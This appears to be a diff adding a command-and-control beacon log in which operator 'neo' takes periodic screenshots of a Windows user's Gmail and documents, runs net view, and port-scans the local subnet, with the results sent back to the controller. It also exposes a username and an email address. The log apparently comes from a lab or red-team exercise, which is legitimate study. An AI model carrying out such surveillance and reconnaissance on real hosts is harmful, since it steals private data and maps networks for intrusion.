@@ -1,0 +1,129 @@
+01/07 09:15:11 UTC [metadata] 192.168.43.216 <- 192.168.43.216; computer: DESKTOP-B0D0J2Q; user: ANH KHOA; process: rundll32.exe; pid: 18920; os: Windows; version: 10.0; build: 19045; beacon arch: x64 (x64)
+01/07 09:16:22 UTC [input] <neo> sleep 5
+01/07 09:16:22 UTC [task] <T1029> Tasked beacon to sleep for 5s
+01/07 09:16:38 UTC [task] <> Tasked beacon to list files in . (from File Browser)
+01/07 09:17:10 UTC [checkin] host called home, sent: 35 bytes
+01/07 09:17:13 UTC [input] <neo> screenwatch 5
+01/07 09:17:13 UTC [task] <T1113, T1093> Tasked beacon to take periodic screenshots
+01/07 09:17:15 UTC [checkin] host called home, sent: 199780 bytes
+01/07 09:17:16 UTC [output]
+received screenshot of Process Hacker [DESKTOP-B0D0J2Q\ANH KHOA] from ANH KHOA (262kb)
+
+01/07 09:17:26 UTC [output]
+received screenshot of Gmail - Sidekick from ANH KHOA (62kb)
+
+01/07 09:17:36 UTC [output]
+received screenshot of Tr?n sent you Thu?ng_T?t_Cu?i_Nam.rar via WeTransfer - khosasuke@gmail.com - Gmail - Sidekick from ANH KHOA (118kb)
+
+01/07 09:17:41 UTC [output]
+received screenshot of Investigating Conti Ransomware on Microsoft Exchange with Splunk | TryHackMe - YouTube - Sidekick from ANH KHOA (178kb)
+
+01/07 09:17:46 UTC [output]
+received screenshot of Thu?ng_T?t_Cu?i_Nam from ANH KHOA (95kb)
+
+01/07 09:17:52 UTC [output]
+received screenshot from ANH KHOA (98kb)
+
+01/07 09:17:57 UTC [output]
+received screenshot of C1NE.03-ProjectPlan-C2&AL - Word from ANH KHOA (85kb)
+
+01/07 09:18:07 UTC [output]
+received screenshot of C1NE.03-ProjectPlan-C2&AL - Word from ANH KHOA (101kb)
+
+01/07 09:18:12 UTC [output]
+received screenshot of C1NE.03-ProjectPlan-C2&AL - Word from ANH KHOA (176kb)
+
+01/07 09:18:17 UTC [output]
+received screenshot of C1NE.03-ProjectPlan-C2&AL - Word from ANH KHOA (180kb)
+
+01/07 09:18:22 UTC [output]
+received screenshot of C1NE.03-ProjectPlan-C2&AL - Word from ANH KHOA (177kb)
+
+01/07 09:18:23 UTC [input] <neo> net view
+01/07 09:18:24 UTC [task] <T1018, T1093> Tasked beacon to run net view
+01/07 09:18:27 UTC [checkin] host called home, sent: 105057 bytes
+01/07 09:18:29 UTC [output]
+received screenshot of C1NE.03-ProjectPlan-C2&AL - Word from ANH KHOA (171kb)
+
+01/07 09:18:29 UTC [output]
+received output:
+List of hosts:
+
+
+
+01/07 09:18:34 UTC [output]
+received screenshot of C1NE.03-ProjectPlan-C2&AL - Word from ANH KHOA (183kb)
+
+01/07 09:18:39 UTC [checkin] host called home, sent: 1734 bytes
+01/07 09:18:39 UTC [output]
+received screenshot of C1NE.03-ProjectPlan-C2&AL - Word from ANH KHOA (183kb)
+
+01/07 09:18:44 UTC [output]
+received screenshot of C1NE.03-ProjectPlan-C2&AL - Word from ANH KHOA (163kb)
+
+01/07 09:18:49 UTC [output]
+received screenshot of C1NE.03-ProjectPlan-C2&AL - Word from ANH KHOA (176kb)
+
+01/07 09:18:50 UTC [input] <neo> portscan 192.168.43.0-192.168.43.255 1-1024,3389,5000-6000 arp 1024
+01/07 09:18:50 UTC [task] <T1046, T1093> Tasked beacon to scan ports 1-1024,3389,5000-6000 on 192.168.43.0-192.168.43.255
+01/07 09:18:54 UTC [checkin] host called home, sent: 93797 bytes
+01/07 09:18:55 UTC [output]
+received screenshot of C1NE.03-ProjectPlan-C2&AL - Word from ANH KHOA (189kb)
+
+01/07 09:19:00 UTC [output]
+received screenshot of C1NE.03-ProjectPlan-C2&AL - Word from ANH KHOA (165kb)
+
+01/07 09:19:00 UTC [output]
+received output:
+(ARP) Target '192.168.43.1' is alive. (ARP) Target '192.168.43.2' is alive. 2608--796A--F3C5--3852--7684--9D5B
+
+
+
+01/07 09:19:05 UTC [output]
+received screenshot of C1NE.03-ProjectPlan-C2&AL - Word from ANH KHOA (157kb)
+
+01/07 09:19:10 UTC [output]
+received screenshot of C1NE.03-ProjectPlan-C2&AL - Word from ANH KHOA (157kb)
+
+01/07 09:19:16 UTC [output]
+received screenshot of C1NE.03-ProjectPlan-C2&AL - Word from ANH KHOA (157kb)
+
+01/07 09:19:16 UTC [output]
+received output:
+(ARP) Target '192.168.43.167' is alive. (ARP) Target '192.168.43.162' is alive. 0808--6A6A--C5C5--5252--8484--5B5B
+
+
+
+01/07 09:19:21 UTC [output]
+received screenshot of C1NE.03-ProjectPlan-C2&AL - Word from ANH KHOA (176kb)
+
+01/07 09:19:21 UTC [output]
+received output:
+ Server Name             IP Address                       Platform  Version  Type   Comment
+ -----------             ----------                       --------  -------  ----   -------
+[-] Error: 6118
+
+
+01/07 09:19:21 UTC [output]
+received output:
+(ARP) Target '192.168.43.216' is alive. AC-12-03-4E-9C-4C
+
+
+01/07 09:19:26 UTC [output]
+received screenshot of C1NE.03-ProjectPlan-C2&AL - Word from ANH KHOA (177kb)
+
+01/07 09:19:26 UTC [output]
+received output:
+192.168.43.216:5650
+192.168.43.216:5040
+192.168.43.216:3389
+
+
+01/07 09:19:31 UTC [output]
+received output:
+192.168.43.216:912
+192.168.43.216:902
+192.168.43.216:139
+192.168.43.216:135
+
+
